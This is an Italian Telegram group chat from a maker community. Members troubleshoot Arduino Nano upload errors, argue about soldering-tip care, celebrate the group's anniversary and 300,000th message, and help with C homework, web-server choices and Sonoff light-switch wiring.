si stava inviando la foto 
inoltra la lista
 
Anvedi?
Sono 9
è una parte della lista
ovviamente Marco è importante e appare 2 volte 
\ban 

(guarda come controllano tutti se è effettivamente vero )
Non era quello vero o forse si
Wtf
Ahahahahahha
qualcuno di voi è appassionato di costituzione italiana? 

si, è quello vero 
Serve il Leonardino Nazionale
qualcuno che conosce bene bene bene la nostra amata costituzione
 io ti ho donato Netflix... Rivoglio il mio nome tra gli admin
coff... 
... coff...
tra i mod ci sei 
il chat id è troppo alto
ho sparato un numero a caso, non so a memoria il suo id 
My error sorry
Ahaha cos

Bastava un suo messaggio per risalire al suo id ad esempio tramite infouserbot
No
Non c'è bisogno di tutto sto bordello
.
 
O se proprio voleva essere una spia russa
Scrivimi pure in pvt qua su telegram, poi possiamo sentirci su Hangouts 
fiigoo
non h ocapito come fai
Inoltra il messaggio a quel bot
E ti ritorna il json
figo
Come se vedessi le getUpdates() del bot ricevente  quel mex
No
Se è fatto con telepot è proprio una stronzata
Già
Ma tu sei Francesco
...
def handle(msg):
id = msg["message"]["from"]["id"]

bot.sendMessage(id, "<code>%s</code>" % msg, "HTML")
O qualcosa del genere
Si
si
il francesco francesco che conosci
gienta, appena adesso, non si sa perchè o come, arduino non compila più
dopo 10 minuti ad aspettare mi esce con un errore del tipo non è stata trovata alcuna scheda, via seriale invece o mi dice "serial port busy" o non mi rileva nulla
e intanto, mentre tento di fare ciò, lui esegue l'ultimo codice caricatogli
anche se dopo un po' si bugga, come se gli venisse inviato qualcosa via seriale
In realtà sono founder, quindi il fatto di avere la chat aperta e il gruppo ancora esistente...
Bastava vedere qualsiasi mio warn da Adminanza
🤔
Rimettimi admin
ma era un semplice messaggio scherzoso 
sai che invece, se tu uscissi, il gruppo rimarrebbe lo stesso?
semplicemente se quando esci nessun admin ha il potere di aggiungere altri admin, sei fottuto 
satto
Mi da questo errore con Arduino Nano, mi sapete dare una mano?
avrdude: stk500_recv(): programmer is not responding
avrdude: stk500_getsync() attempt 10 of 10: not in sync: resp=0x97
Problema di caricamento sulla scheda. Guarda 
 per suggerimenti
cos'è, un'epidemia di Arduini? 
anche a 
 e a me non va
Nono i supergruppi spariscono
Fino a stamattina ok.....
Gruppi normali passi l'autorità al primo admin aggiunto, supergruppi vengono eliminati
Mo lo svincolo dalla finestra
nope
ho trasferito 3 supergruppi creati da me sul mio voip hahaahaha
Almeno se non hanno cambiato
A me fino a 5 minuti fa andava
Forse domani mattina al risveglio è più tranquillo
rimane a "sto caricando" e niente...non carica
la porta è selezionata, il problema me lo da dicendomi tipo "porta seriale occupata"
Teknologia
Ehh sei arretrato
Puoi trasmettere lo schermo anche attraverso il Guai-Fai
No, ho detto tramite HDMI
e niente, io piango, ho addirittura provato con il potere supremo dei tecnici della scuola ma nulla
sarà andata a farsi fox la cinesata?
noh, tralasciando che l'arduino è origginal, funziona ancora, voglio dire, il suo lavoro lo fa, è l'ide che si è fottuto qua
speriamo
sia questo
è questo
sono riuscito a sbuggarlo premendo tasti a caso, fai te
ora si è ribuggato...torno a premere tasti a caso
fai attenzione al caso
tu sei un cribbio di iettatore
non si sbugga più
perchè non compili dio cribbiooo
anche a me
Arduino nano
Non bestemmiare
bene, e 4 
tutte le sto provando......
e poi trovo questo
traduci
"Con una sberla ti inverto le orecchie"
inverto mi ha steso
ogni volta che ricollego la scheda installa aggiorna libreria
su arduino mega parte
e subito
è fottuto il nano malefico cinese
appunto
si può resettare il bootloader?
se si come?
hahaha, chebbella la vita, vabb, domani tanto tornerà a funzionare tutto

Io una la ho invertita ad off
Manco l'audio parte 
solo a me non va Spotify?
Vabbene la mia o è troppo pulita?
Con un altro arduino xD
Onestamente, sapete come pulirlo?
Cercati informazioni riguardo ai programmatori ISP, non credo che 
 abbia fatto un video... Anche se è utile per chi vuole farsi una propria scheda e comprare atmega vergini
usare un po' di pasta stagna e carta vetratra un pelo di stagno e uno straccio no?
La carta vetrata non andrebbe mai usata, scalda la punta togli l'ossido con della pasta flussante e se proprio non viene via allora prova a raschiarla con una lama di un taglierino
no è un portatile vecchio, lascia stare, è una truffona
da me lo faceva il corriere GLS..ogni volta rimanevo a casa per ricevere pacchi importanti e quel coglione sfaticato tirava dritto fino al deposito..fino a quando non gli ho ribaltato l'ufficio e ho gridato in faccia al direttore..dopo 2 mesi ho saputo che l'hanno licenziato in tronco perchè altre decine di persone si sono lamentate
ma io che ho fatto di male? risparmiami nipotino
ma sei pazzo? non si usa mai la carta vetrata sul saldatore! solamente spugna bagnata oppure un fazzoletto di stoffa bagnato..l'unica cosa che può essere usata ogni tanto, bagnata ovviamente, è la lana d'ottone
Buonasera
bah, io la scartavetro sempre per bene ed esce beeeella lucente, mai fatto graffi
bravo, cosi puoi buttare la punta  si rovina il rivestimento e non entra in temperatura..non va mai scartavetrata la punta, è la prima regola base..sempre spugna imbevuta oppure fazzoletto bagnato..al massimo puoi passare la punta nella pasta colofonia
c'è per carita, non avendo carta vetrata a casa non l'ho mai usata sul nuovo saldatore ma su quello vecchio lo facevo sempre, contando che già di suo era un miracolo se lo stagno lo fondeva non deve essere peggiorato con la  carta vetrata perchè altrimenti lo potevi direttamente leccare
Raga qual'è il topic principale di questo gruppo?
vabbè se è un saldatore scarso, scarso rimane 
comunque ora uso un panno, tipo stoffa, con un po' di stagnosald e stagno e via
programmazione, arduino, raspberry, pc, portatili, droni, componenti, fisica, matematica, ecc
già va meglio
non volevo dirlo ma usare lo stagnosald è più rilassante del pluriball, sentire quando scoppietta è bellissimo quindi ora uso sempre quello per ogni cosa
senti quel bel rumore di frittura
sattoh

Auguri al canale makers ora!
Buon compleanno
Yes, oggi si soffia una candelina
Auguri
AUGURIIII
Auguri makersita
❤️
Auguri gente! 
Auguri raga
Auguri Makers 
Io la riempio di stagno su tutto il contorno e poi lo pulisco con l'ovatta
Ragazzi, come faccio per bene le piste di stagno sul PCB?
Con la punta pulita e tanto stagno
E non escono storte lo stesso?
Punta pulita intendi anche senza stagno?
Si
Aee
Poi ce lo metti sopra e tocchi la parte da collegare, e si collega
Manda foto di come devi fare
È un casino
Stavo chiedendo, vorrei imparare
Ah ok
Ma tht?
Che?
Through hole technology
(Millefori)
Si
: 
Grazie
ragazzi quando uscirá google assistant per raspberry in italiano?
Qualcuno programma il lampone?
Io vorrei capire come usare i pin GPIO
Auguri al gruppo 
Momento momento momento momento
Che festa è oggi?
Il 17
Clicca e guarda la data
Ahhhh
Ma oggi una signora in autobus ha detto auguri ad una
Pensavo ci fosse qualche festa nazionale
Eh vabbè sarà stato il suo compleanno
O è nato il nipotino o si è sposato il cugino
Coincidenze io non credo
Che ne sai 
Forse era la mamma di 
 e le hanno fatto gli auguri da passare a Marco per 
Il compleanno del gruppo 
Allora vuol dire che ho incontrato la persona che ha messo al mondo romboli Gesù allora esisiti
Ok ho esagerato
Però
Buona Pasqua
Emmadonna mica è una suora di clausura povera donna
Ma che ?? Ops
Perfetto
Allora prendo il primo che mi hai mandato forse
Perchè costa quanto il secondo ma il secondo è peggio tipo una differenza di 4G
Auguri
Ragazzi dovrei comprare un paio di cuffie da usare principalmente per ascoltare musica e un po' di gaming, vorrei spendere sui 50 60 euro e vorrei che siano anche bluetooth... Cosa mi consigliate?
On ear
Benvenuti!
Ha sempre effetto spammare il gruppo sul canale 
Per quella fascia di prezzo non ti consiglierei delle cuffie Bluetooth
Anche un po' di piu
Piuttosto vatti a vedere le Sennheiser HD 2.20s e 4.20s per quel prezzo
Silenzia il bot
Ehh io vole o entrare da un po' ma non trovavo il link
Guardalo su eBay

Cosa ne pensate ?
Bastava cercare "gruppo", in realta: il terzo risultato era il link 
Comunque benvenuti!
Secondo voi qual'è il miglior smartwatch per Android?
Sotto i 50 senza bluetooth ci sono le ottime superlux hd681 evo, direi le migliori cuffie sotto i 50 euro
Per il compleanno del gruppo possiamo trovarci per l'aperitivo...
Analcolico per i minorenni
Un aperitivo overVolt nelle principali città italiane
Il 95%?
Eeeh ma no
Sì sboccia col bitter
E con l'aranciata
Ciao a tutti!
Ho cliccato per sbaglio 2 tasti
E windows  è diventato bianco nero
Wtf
Mannaggia ai piccioni
Woo ho scoperto ora che cliccando su un Tag su tgx si apre una lista dei messaggi che lo contengono 
Ero rimasto all ricerca
Tu brutto bimbo che fuma
Vero
Auguri ai maker$!
Ma non sono io
Neanche fumo
Ahhh
Tu buono bimbo che non fuma
Che disgustoso sto sticker
Bellissimo
Benvenuti!!
Grazie ^-^
ctrl + win + c
spam* sorry
Benvenuti a tutti, comunque 
Ciao✌️
Orso Pippo in privata potresti darmi una mano riguardo il mining? Grazie
Comunque bel nome
Ciao a tutti
C'è qualcuno di voi associato a un fablab a Modena/Bologna?
Benvenuti!
 TELEGRAM VIETATO IN RUSSIA: È UNA CACCIA. BLOCCATI GLI IP DI 15 MILIONI DI PERSONE. NEGATO ACCESSO ANCHE A TUTTE LE ALTRE APP COME VIBER E WHATSAPP  



arrivato tardi 
 


questo??
Augurissimi gruppone!!!!
A voi oggi dedico questa perla
lol
Ahahah
HAHAHAHAHAHA
ma da me va a "connectiong to programmer: .avrdude: butterfly_recv(): programmer is not responding" l'arduino, da ieri, aiuto, ho provato di tutto
cambio pc tra poco a sto punto

Tra 465 messaggi siamo a 300.000 
🆘ho risolto il problema di comunicazione tra IDE e il Nano Cinese
siamo vecchi 
qualche messaggio veloce per arrivare a 300000
Ho mutato la mano,spamma subito un botto di messagi(whops non bannami padrone sto scherzando)
No ti prego!
Un secondo ho pensato che mi hai veramente bannato
Sono 822 messaggi al giorno di media, comunque
Pochi dobbiamo raggiungere il 3k in media
dobbiamo raggiungere i trenta 
 al giorno allora 
LoL
Ciao :D conoscete libri dove imparare il c?
lo avevo trovato semplice
Grazie mille :D
Raga voglio distruggere il pc.l'unico server di MC che mi piaceva lagga,ovvero non il server ma il mio pc non riesco a fare un cazzo ,oltre la grafica come altro posso ottimizare il gioco?
Se MC lagga hai un PC del cazzo
ma a che serve dirmi la verita?
Io ci giocavo con un Pentium g945 e una radeon HD 6570
E solamente 2gb di RAM
Anchio ho 2 gb di ram
CPU e GPU?
Ehm ,plz non bestemmiare,ma non so dove posso guardare?
Va bene gia bestemmi,vabbè gg .-.
ok, confermo, ieri sera, non si sa perchè o come, il mio arduino si è brickato da solo, bello
In Esplora risorse apri "computer" fai tasto destro e fai su proprietà
E manda foto
quinidi?
Leeeeeeeens 
 
Solo per qualche istante
Ora non c'è più
Poi vai su gestione dispositivi e screena
questo?
Esatto, estendi su schede video
Fisso giusto?
yeah
Non hai una scheda grafica
come si chiama in eng?
GPU oppure Graphic Processing Unity

Graphics Processing Unit - Wikipedia
ah ma lol ma allora come carica i giochi? XD
Usa la "scheda video" della CPU ma se usi una scheda video con le palle e cambi CPU e RAM funziona bene
Tipo un i5, 4gb di RAM e non so che GPU consigliarti
GTA 4 dovrebbe girarci tipo
Correggetemi se sbaglio
eh quello lo compro quando avro i miei soldi,i miei mi hanno detto di comprarmi un buon notebook per il compleano. spero che non sara come sto fisso .-.


: Alienware: Elettronica

leggo un Vicenza 
Raghi
ma un notebook 700-800 euro andrebbe bene?
Credo di si
e che io ora nel pc ho un mare di giochi lol

I migliori portatili gaming del momento - Tom's Hardware
emmm vivo in armenia,quindi potrebbe costare la spedizione
ma i giochi che si trovano nel disco D fanno laggare troppo il pc?
Eh la piazza
wow ma sei rapido,cmq grazie per i link 
G board
Ho già parlato dell'unico problema della gboard?
Il correttore?
La cattiva gestione degli spazi prima e dopo la punteggiatura
Benvenuto!! - 6!
Ciao
Grazie
Cicca, indovina chi ha iniziato col CSS e non riesce a combinare nulla? 
Tutto il mondo? 
Hai provato la optifine?
Questa è la vera tristezza
Siiiiii
bella, debrickata con il raspberry, tornata operativa, taaaaaak

Suvvia, fai tante prove e piano piano impari
solo che mi sa che da ora in poi devo usare il rasp per caricargli codici
Va che casino per debrickarla
Io mi limito a checkare proxy
 Un Proxy con 13 di ping, bello bello mi piace ya
Mi puoi dare una mano due secondi? 
Sono a lezione, se è una cosa breve si
si prendi il primo Dell che è ottimo
anche questo è buono
È il venditore che non è buono
Ragazzi ho dei server dedicati su 
Ma non riesco a minarci, blocca tutti gli IP delle pool
Se utilizzo un Proxy server dite che riesco a bypassare?
eh lo so, io mi riferivo al modello
ok si...ora, funziona se compilo da rasp mentre da pc gli parte l'attacco epilettico e vedi che il led che dovrebbe mostrare il caricamento parte a frequenze mai viste prima e sullo schermo del crt esce qualcosa, come se tutti i pin si mettessero a far uscire corrente accaso appena premo upload, io non so più che fare
Fai pratica e fattelo piacere. Se hai bisogno di aiuto ci sono io che ahimè lo uso da un anno o più
Il CSS all'inizio non fa MAI quello che vuoi
Non è vero, sei tu che non fai MAI quello che vuoi 

Perchè quando diventi bravo, non impari ad assecondare il css ma impari ad usarlo
Direi che impari a dominarlo ahah
USARLO
Invece PHP è diverso
Più lo usi peggio diventa
Anche se ha il suo fascino
Ci ho fatto poco sinceramente
Scusatemi per il disturbo ma quando provo a installare swichando con il comando il raspberry dice che non trova l’indirizzo da cui scaricare lo zip. 
Come posso risolvere?
Cerca un link nuovo
Raga che ne pensate di questa attrezzatura per iniziare con l'elettronica?

Multimetro:




 
sensori:




 
kit:




 
saldatore:



la robba che hai scelto ci sta, con tutti quei sensori ce ne fai di roba, più che altro, per il saldatore per essere di quelli ultraeconomici ha anche la scelta della temperatura quindi ci può stare, più che altro magari uno con la base forse è più comodo, poi vedi te
thanks
Ragazzi mi consigliate un buon saldatore economico su Amazon?
il problema e che sto server ha un suo launcher
ma non lagga il server,e neanche ho rete di merda

guardate questa raga
economico quanto 50 euro?
🤣🤣🤣🤣🤣🤣🤣🤣🤣🤣
Sui massimo 15/20  proprio per iniziare
secondo me ti conviene spendere un po di piu

Tipo quanto ?
40 50
o questo un po piu economico 
vuoi un consiglio? multimetro e sopratutto il saldatore prendili su Amazon, almeno se hai problemi hai la loro fantastica garanzia..te li cerco io 2 buoni
Ok grazie

multimetro prendi questo
oppure questo
saldatore invece prendi l'Ersa che ti hanno consigliato su oppure uno di questi
sono sempre professionali
Guardate  la cosa scritta in verde ,voglio sto tutorial haahha
Non l’ho capita
Bo non so come spiegarti
raga, ho cambiato alimentatore al fisso
sto sudando come un porco ma almeno non è esploso niente
ragazzi mi sapete dire perchè quando gioco con il pc vicino alla tv sulla tv lagga invece nel monitor del pc è fluido?
i makers fanno il compleanno lo stesso giorno di una amica mia
ah, auguriiiii
Anche quella base che ho linkato prima è buona per questo prezzo
La ho e funziona bene
Benvenuti a tutti i nuovi! - 3 e siamo a 600
Grazie!
ohhh si fa la festaaa
- 3 membri e 291 messaggi  ce la facciamo a fare il botto oggi?
2 a 600...
Eeeeeeee
1 a 600
Mi fido
-1
Sarò io il 600
Eccomi!
600!
Con enomis si, avevi dubbi? 
Uuuuuuuuuuh
Festaaaa
Dai ragazzi spammiamo sti 280 messaggi stasera
270*
Così il giorno del primo compleanno facciamo 300000 messaggi, 600 iscritti
1 anno,
600 utenti*,
300k messaggi
WOW 


*saremmo di più se la mano non facesse pulizia
Quindi spaaaaam
abilitiamo le gif fino a mezzanotte?
Eh devi chiedere al boss
Con arduino posso collegare 4 pulsanti alla stessa resistenza?
Di pulldown
Siiiii era ora
Altri 66 e..SATAN CONFIRMED
Spammer mode active
Ciao ragazzi, sapete consigliarmi qualche sito con tanti bei progetti Arduino?
Molti
Dipende poi dal materiale che hai
Piccola nota sui 600 membri: ci sono 4 bot, 3 utenti con account eliminato e 8 con ultimo accesso "seen a long time ago"
GIF abilitate fino a mezzanotte, guys
i bot è normale, per gli utenti inattivi domani facciamo pulizia
l'abbiamo sempre fatta ai 600 membri
Erasolo per specificare che 600 non sono il numero di utenti presenti
sssh, è vero 
questa gif va a 128 BPM 
ai messaggi ci penso io, qualcuno prepari i voip, su, su
sto ascoltando Byte ed è perfettamente sincronizzata
A cosa servirebbe?
piano con lo spam però
Scusate
basta ora
Mi sono emozionanto troppo
Linka la canzone
sennò finisce come quella sera in cui hanno sbannato il canale a Marco 

: 
Aaaaaah
(Ema, è tre giorni che ho la tua playlist nelle cuffie per tipo 6 ore al giorno, basta)
I materiali non sono un problema cerco qualche progetto sfizioso
In questi ultimi giorni sto andando di techno e trance (in particolare goa/spy trance intervallato con brani techno)
 o qualcosa del genere
Io direi 64, che è sempre lo stesso, ma è più adeguato
bpm cosa vuol dire? no perchè da quanto sono fatto mi viene da dire "bit per metro"
Battiti per minuto
a in quel senso proprio
E comunque bit per metro non ha molto senso
sisi, era una battuta 
appunto

L'unico senso che potrebbe avere è nel caso si stia parlando di un nastro magnerico
?
600 membri
Quanto ancora dobbiamo spammare?
Fino a raggiungere i 300000messaggi
🤣🤣
no gente
dipende se vuoi essere bannato
il troppo é troppo 
Oh no
Non bannarmi please
Sei stato ammonito nel gruppo Makers ITA per la 1° volta su 3 per 

Se ora mando un gif mi ammonite?
160 messaggi
160 gif
Odddiooo
*159 gif
*157 gif
*155 gif
Lel
Gif--
While(messages <= 300000){spamgifs(); messages++;}
Prima avvio e stampa
Bella funziona bene
Ma hacking non doveva uscire sabato?
Wow
Grazieee!
Oggi il gruppo 
 compie un anno esatto dall'apertura! 
Tanti auguri makers italiani! 🤖
Ragazzi vendo 3 Arduino mega originali... Uno ancora sigillato nella scatola... Contattatemi in privato
Come mai sarà ancora sigillato? 
Perché non l'ho mai utilizzato 
deve ancora fare il video 
-132 messaggi 
Un paio di ottime GIF ci tenevo a spammarle anche io
Anche se non c'entrano una mazza
 continui ad aiutare con il c che sono una capra?
Ha ha ha
è dai dica dica
facciamo partire la catena?
printf("Hello world");

Se sai questo sei a posto
:




:




:

La traccia è: programma che legge una serie di numeri da tastiera, e quando viene inserito lo 0 indica il maggiore è il minore tra i numeri inseriti
Chiedi a 
 mi aiuti?
Scherzavo
Così a caso, senza nemmeno provarlo, non sono al pc
Durov è il creatore di telegram
 va questo?
beh int i==0; no di sicuro, semmai int i=0; prima di tutto
e poi non serve proprio a nulla quell'if(i==0) in realtà, lo si può proprio eludere, basta inizializzare max e min a 0
e poi è while(x!=0);
per il resto è apposto
Io non ti posso aiutare con il codice perché il C non lo studio più da qualche anno e me lo ricordo molto poco.
Ti posso dare una mano con la logica del programma, al massimo, basandomi anche sul codice scritto da 
.
Sicuramente devi prima crearti tre variabili, una per il numero che viene preso in input, una per il numero più grande e una per quello più piccolo. Poi fai un ciclo che termina solo quando l'input é uguale a 0. Dentro al ciclio fai dei controlli: se il numero in input é più grande di quello attualmente segnato come maggiore allora il numero in input diventerà il nuovo numero maggiore. Stessa cosa per un eventuale numero minore.
Quando esci dal ciclo infine stampi i due numeri
Comunque, guardando il codice di Enrico, veramente non ricordo una mazza di c
Grazie
93 messaggi mancano
92
(clicca qui )  / unaltromessaggio
Come farmare messaggi 
lol
E povera Mano che deve cancellarli tutti appena li vede
Vediamo a che punto siamo 🤔
La mia aspettativa di vista si sta riducendo piano piano, prima inizio a stampare con dell'abs in un luogo chiuso, ora sto usando del solvente nitro per lo smothing
Eh ancora 57
Arriviamo
Arriviamo
44 gatti
In fila per
Col resto di
Stasera ci si arriva
Pulizia kontattiii
Piano con lo spam però 
 dubbio amletico...
Ma se uno posta uno sticker comuna bestemmia ban??
SOLO A SCOPO INFORMATIVO
Ahahaha
Yep
Ahahah
Oddio
Ora si arrabbiano tutti
Non avevo intenzione di farlo
Non è stata colpa mia
C’erano le cavallette
Ma stai scrivendo solo tu, lol
Santissimo padre che sei nei cieli aiutami
Ahahahaha
Così finiamo i messaggi
Sisi tranquillo
Ma chi usa Linux mangia i bambini?
*chi usa windows
Ma cos
Lol
E chi é bipolare come me e gli Usa entrambi?
USA
-15
Ok dopo questa mi vado a buttare da un ponte
Addio
si lo so, ma costa qualcosina in più la Fixpoint
bravo gio
-10
??
10 messaggi a 300k
Ahhh
Figata
300k son tanti... In un solo anno... Complimenti a Marco! -5


                 NEL GIORNO
    DEL PRIMO COMPLEANNO
                 DEL GRUPPO

                 


                 QUESTO È IL

            3 0 0 . 0 0 0 °  

        MESSAGGIO INVIATO

                    


Noooo
Mi avete fregato
300003
Avevo preparato il milestone
Ma anche col silenzio i messaggi sono inviati e dopo cancellati

Qual'è il 300k ??
Chi ha mandato il 300000?
Prendo il tester su amazon, il saldatore dispiace ma più cineso è più sono felice di fonderlo
Il credo di aver mandato il 300001
Allora é il mio
Perché ho scritto cattivo
Come hai mutato il gruppo xD
Nope
Mi sa che e' di aes
È questo
Ma lol
Dimmi
Complimenti 
 hai vinto un biscotto
AHAHAH
Non sto capendo
Questa è fantastica
Hai inviato il 300.000 messaggio di questo gruppo
Mi hai soffiato il 300k messaggio
Complimenti per aver inviato il 300'000esimo messaggio
Ah figo
Prima del milestone del boss
 fai esperienze e bestemmie, male non fa
Alla fede religiosa si, ma si entra in altri campi...

Oggi la professoressa di religione (mentre io ero fuori dalla classe): "ma Andreasi non é ateo non può dimostrare che dio non esiste"
Anche se fossi pastafariano non saresti in grado di dimostrare che dio esiste/non esiste
Niente esiste fino a quando non viene dimostrato il contrario
E anche tutto esiste finché non ne viene dimostrata una confutazione
relativismo bitch❤️
Ragioniamo secondo il metodo sperimentale
Non puoi
Attento è una donna. Potrebbe capire male
NON É POSSIBILE... FIGA IN QUESTO GRUPPO??
Quello pretende si parta dall'osservazione, ma non esiste osservazione della presenza dell'influenza divina, se ti va di discuterne passa in privato, non vorrei finissimo mutati
Lascia stare... Finirebbe male
Kek non siamo bambini di 11 anni
O forse si?
No ne ho 15
Però sono stanco e ed ho appena tirato una raffica di simpatice imprecazioni alla madonna
Era una citazione a vsauce, non intendevo fare critiche
(si ho sbattuto il ginocchio)
E le piace essere contattata in privato
Cit
Idem, tranne che ho ancora il ginocchio
Come dice il saggio 
 se non vedo non credo
Chi si ricorda sta gif ?
Cos'è, misterX o missX?
Da quanto tempo
Hahahhahah 
Come passa veloce il tempo
Io ho già 15 anni... Ho già Delle responsabilità legali 
Sono vecchio help
Sei comunque più gggiovine di me
Ah ragà una domanda... Per chi va a scuola... Nelle vostre scuole vi fanno i test antidroga a campione
?
Stai zitto che tu non hai i capelli bianchi pur essendo minorenne
No
Allora sono solo io lo stronzo?
Raramente
In 4 anni è successo 3 volte
K
come te la passi con quell'alimentatore?
Non ti può rispondere... Probabilmente l'alimentatore é esploso
IRONIA
Può darsi
Va be' io vado a dormire... A domani se non mi arrestato prima
 bravo ragazzo, vedo che hai ascoltato lo zio Korry...ottimo il Seasonic
[PC DI OVERVOLT]
Ho appena aggiornato la lista delle componenti del pc Intel inserendo quelle che mancavano (cioè MoBo e alimentatore).

Il mio PC definitivo quindi sarà
 
 

(Invece la build AMD Ryzen che avevo acquistato prima di collaborare con intel era 
)
Solo perché costava 10€ in meno dell'EVGA G3
sono ottimi entrambi, anche l'EVGA è un Seasonic
ou basta spammare
Avete abilitato le GIF?
tolte tolte
Ah si, l'ho fatto in tre minuti al volo, inizializzare max e min a zero è sbagliato perché se inserisci 3 e 5 ti considera come minimo zero
300087
300088
300089
300090
basta 
poi fate scappare la gente per il troppo spam e l'offtopic
E quando si toccheranno i 500000 .
  
Io voglio le GIF 
Roba che scapperei pure noi ahahahah
avete visto lo spam di ieri? meglio evitare
e poi avevo detto fino a mezzanotte 
No
Non lo sapevo 
Okay...
Se è comunista sì
Perché mai?
Non ho particolari problemi
Ma che è iliad?
Il nuovo operatore
Si perchè non deve essere un else if ma un if staccato altrimenti ovvio che non funzioni
Aiutooo
Devo registrare un dominio gratid
Anche .tk va bene
Sapete dove posso trovarlo?
Qualcuno ha usato pix4d?
Prova su 
Già fatto ma è un casino collegarlo al mio ip
Funzionano tutti più o meno così eh
Nono ma da telefono
Non riesco a collegarlo
Da pc nel checkout mi chiede l'IP
Ora non so dove metterlo perché nel checkout non me l'ha chiesto
Non sto  capendo
Devo collegare l'IP del mio server al dominio
E poi vabbè
Dove lo faccio
Eh...che server
Il mio
È un sito apache
E vorrei collegarlo ad un dominio
Eh ho capito
Ma il server dove lo hai? Come lo hai?
È una vps
Hostato su 
E gira su Debian 8
Ah ecco
Freenom ti permette di farlo in vari modi
Uno è usare il dns
Ok
L'altro invece è impostare i registri CNAME tipo
Cerca su Google "link domain to vps"
Okay grazie
Quando finalmente ti arrivano gli M16 comprati nel depweb per andare ad assaltare la zecca italiana...

Guardatela quella serie, è una figata 
Buongiorno! Posso fare una domanda tecnica?
Ragazzi, domanda indirizzata a chi conosce l'ambiente web lato server e specifico lato server (se mi esce qualcuno che mi dice io uso HTML bestemmio, giuro), analizzando bene sia Perl che PHP, quindi vantaggi e svantaggi, qual'è meglio usare?
Anche due
dipende da che cosa vuoi hostare e quanti accessi ti immagini
Diciamo che più che altro deve gestire download e upload di file in Massa diciamo, in un giorno possiamo arrivare anche a 200 upload da 5-10 MB l'uno e 100 download da 20 MB circa
ma contemporanei o distribuiti nella giornata?
nel caso cmq opterei più per node
Mmmm varia, soprattutto di pomeriggio
anche perché molto fa il web server che utilizzi (es. apache, nginx, node etc etc)
Apache per ora
se sei vincolato ad apache e puoi utilizzare php >= 7 allora stai su php
Di rete ho una 2gbps parallela
ma tolta la banda il problema è più nell'allocazione in memoria di sessioni
Si, lo pensavo, comunque ho specificato anche la banda
Okay perfetto
però non si sta parlando di un numero di sessiosi eccessive
cmq andrei tranquillamente con apache/php, trovi più documentazione ed è facilmente mantenibile
discorso diverso se mi parlavi di migliaia di utenze attive in parallelo :P
Per ora no, magari quando crescono gli accessi, vedo di passare a node
Non sono la nasa o la whitehouse


eh, io in azienda gestisco il portale di una grossa compagnia di luce/gas... abbiamo decine di migliaia di accessi all'ora 
Va bene, grazie mille per le risposte completamente esaustive 
Woo gg
Perché dovrebbe essere esploso?
Ragazzi buongiorno mi presento sono Fabio e vivo in Veneto, ho da poco scoperto il canale di Overvolt curiosando dei video per i sonoff, ma siccome non ho capito una cosa posso chiedere a voi?
Ciao Fabio, benvenuto! Chiedi pure, ci sarà sicuramente qualcuno che saprà aiutarti
Praticamente ho già ordinato un paio di sonoff quelli a singolo canale perché voglio iniziare a seguire i vari suggerimenti di Overvolt, quello che non capisco è come faccio ad usarli con interruttori deviatori mantenendo la funzione di deviatore. Cioè mi spiego meglio, io lo dovrei installare in camera da letto, come faccio a mantenere attivi tutti gli interruttori per il lampadario?
Perché su un suo video ho visto che lui lo stacca
Evoco 
 che l'ha fatto
Ok posso chiedere direttamente a lui? O aspetto che risponda nel gruppo?
Aspetta che arrivi, tanto vede la notifica
ok grazie
What's the problem? I deviatori invece di collegarli tra fase e lampadario li colleghi tra GPIO14 e GND, il resto resta invariato
Per favore non ti ci mettere anche tu a scrivermi in privato , gestisco già molte chat vostre al giorno, scrivi sul gruppo, che se tanto la notifica arriva.
cioè? io ho 2 fili della fase, li intreccio insieme e li collego in input al sonoff? ma come fa a stare aperto il "segnale" per gli altri interruttori della camera?
tranquillo, infatti ho chiesto prima di disturbare
Una domanda
Per alimentare un Arduino uno servono 9V e 1A, giusto?
Mmhh...potrei farci un pensierino
Ho appena scoperto che se guardate i miei video con un proxy o una VPN in Finlandia, Youtube mi paga 61 (SESSANTUNO) volte quello che mi paga per le visualizzazioni italiane 
Dai se quest'estate vado in Finlandia come previsto, divento un tuo patreon solo guardando i tuoi video
ragazzi ho un problema, è normale che ho tra i processi attivi tipo 15 Avast Secure Browser?

no puoi usare da 5 a 9v e lamperaggio molto meno
nell'ordine dei 200ma mi pare
Dai 5 ai 18/20 V
Azz con sta cosa della Finlandia si potrebbe fare un business!!! 61$ ogni 1000 vusualizzazioni 
Come massimo ti dicono 16, ma a seconda del regolatore di tensione può accettare 20
bot 
Il lampone chi lo utilizza?
Io 
Uso le arance
Ah ok. .
Quella è una fragola
Ah ok...
eeh non c'é il lampone 
Ahhhh.....
Bella oggi faccio andare le playlist con il proxy...
Ho appena scoperto che se guardate i miei video con un proxy o una VPN in Finlandia, Youtube mi paga 61 (SESSANTUNO) volte quello che mi paga per le visualizzazioni italiane 

Ragazzi nessuno ha una soluzione per i miei deviatori? 
Oppure che mi spieghi quello che mi hanno risposto poco sopra xke sono nabbo in impianti elettrici
Da ora solo vpn in finlandia
Ho appena scoperto che se guardate i miei video con un proxy o una VPN in Finlandia, Youtube mi paga 61 (SESSANTUNO) volte quello che mi paga per le visualizzazioni italiane 
Ahahahahahah
Sostieni OverVolt, compra VPN finlandesi  (Pubblicità Progresso)
Ho appena scoperto che se guardate i miei video con un proxy o una VPN in Finlandia, Youtube mi paga 61 (SESSANTUNO) volte quello che mi paga per le visualizzazioni italiane 
tutti sulla VPN lappone allora..andiamo a farci un giro con le renne
Ho appena scoperto che se guardate i miei video con un proxy o una VPN in Finlandia, Youtube mi paga 61 (SESSANTUNO) volte quello che mi paga per le visualizzazioni italiane 
troppo NetFlix fa male
Si ma è troppo ingiusto
Che i fucking finlandesi prendano sessantuno volte quello che prendono gli italiani
ora capisci perchè quel cesso biondo di PewDiePie è ricco sfondato..anche se lui è svedese
Marco trasferisciti li  non avresti neanche problemi di raffreddamento..Overclock a go-gò
duoende chi li guarda, pero fai conto che li ci sono meno di 6 milioni di avitanti quindi c'è molta meno gente che li guarda
Si vabbè, allora parliamo degli USA che hanno i CPM 8 volte più alti e centinaia di milioni di genti
Benvenuti ai nuovi!
Grazie
 ma quindi è finita l'odissea del super computer?
li è anche un fattore di immagine ed economico..le maggiori multinazionali dell'informatica e dell'elettronica hanno sede li, è normale che investano di più in sponsorizzazioni e pubblicità..perchè Youtube per loro questo è, pubblicità
Oggi provo a fare un gioco in due d visto che le basi ce le ho
Linguaggio/Framework?
Qualcuno gioca a Yugioh Duel Links qua?
Linguaggio ma intendo con c#
Visual C#?
Si
È l'unica cosa che ho capito bene per programma un gioco
Gli altri progàmmi sono troppo complicato
Complicati
Scusate il correttore
UtilizNdo unity
